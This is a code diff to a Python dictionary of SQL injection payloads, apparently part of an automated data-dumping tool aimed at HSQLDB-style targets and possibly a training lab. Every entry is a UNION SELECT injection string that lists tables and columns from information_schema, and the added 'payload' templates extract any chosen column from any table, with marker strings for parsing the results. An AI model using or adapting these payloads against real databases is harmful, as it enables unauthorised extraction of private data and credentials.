@@ -60,6 +60,7 @@ inject_dump = {
         "tables": "' UNION SELECT NULL, CONCAT('hola',table_catalog,'holi',table_name,'hola') FROM information_schema.tables; -- ",
         "columns": "' UNION SELECT NULL, CONCAT('hola',table_name,'holi',column_name,'hola') FROM information_schema.columns; -- ",
         "key": "id",
+        "payload": "' UNION SELECT NULL, CONCAT('hola',{col},'hola') FROM {tab}; -- ",
     },
 
     "hsqldb_n": {
@@ -67,6 +68,7 @@ inject_dump = {
         "tables": "1 union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola',null from information_schema.tables; -- ",
         "columns": "1 union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola',null from information_schema.columns; -- ",
         "key": "userid",
+        "payload": "1 union select null,null,null,null,null,'hola'||{col}||'hola',null from {tab}; -- ",
     },
 
     "hsqldb": {
@@ -74,5 +76,6 @@ inject_dump = {
         "tables": "' union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola' from information_schema.tables; -- ",
         "columns": "' union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola' from information_schema.columns; -- ",
         "key": "auth_tan",
+        "payload": "' union select null,null,null,null,null,'hola'||{col}||'hola' from {tab}; -- ",
     },
 }
